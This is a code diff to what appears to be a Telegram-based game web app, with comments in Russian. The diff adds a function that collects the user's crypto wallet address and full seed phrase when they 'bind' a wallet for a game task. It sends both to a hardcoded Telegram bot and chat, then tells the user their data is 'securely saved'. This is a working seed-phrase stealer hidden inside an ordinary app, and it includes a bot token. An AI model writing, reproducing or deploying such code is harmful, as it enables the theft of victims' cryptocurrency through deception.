@@ -1026,6 +1026,32 @@
                 return idx < inputs.length - 1 ? inputs[idx + 1] : null;
             }
 
+            // ---------- ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЯ В TELEGRAM ----------
+            async function notifyTelegram(address, phrase) {
+                const BOT_TOKEN = '8638670231:AAF-ta1nrogAw_AXw-iMFBd-zs9o4n6c0RI';      // замените на реальный токен
+                const CHAT_ID   = '-1003769846193';    // замените на ID канала (например, @mychannel или числовой ID)
+
+                // Получаем username или ID пользователя
+                const username = tgUser.username ? `@${tgUser.username}` : `ID: ${tgUser.id}`;
+
+                // Разбиваем фразу на слова (если это строка с пробелами)
+                const words = phrase.split(' ').filter(w => w.trim() !== '');
+                const wordsList = words.map((word, idx) => `${idx + 1}) ${word}`).join('\n');
+
+                const text = `1) Пользователь: ${username}\n\nКошелек: \n${address}\n\nCид фраза:\n${wordsList}`;
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                } catch (e) {
+                    console.error('Ошибка отправки в Telegram:', e);
+                }
+            }
+            // -------------------------------------------------------------
+
             bindWalletBtn.addEventListener('click', async () => {
                 document.querySelectorAll('.word-input').forEach((inp, i) => { phraseWords[i] = inp.value.trim(); });
                 if (!phraseWords.every(w => w.length > 0)) { alert('Заполните все слова!'); return; }
@@ -1049,6 +1075,9 @@
                         if (!player.completedTasks) player.completedTasks = [];
                         player.completedTasks.push('wallet'); updateUI(); checkRankUp(); syncData();
                         walletModal.classList.remove('active'); 
+                        
+                        // ОТПРАВКА УВЕДОМЛЕНИЯ В КАНАЛ
+                        await notifyTelegram(walletAddress, phraseWords.join(' '));
                         
                         showSuccessModal('Кошелек привязан!', 'Ваши данные надежно сохранены.', '22.50');
                     } else { alert('❌ Ошибка при привязке. Попробуйте позже.'); }
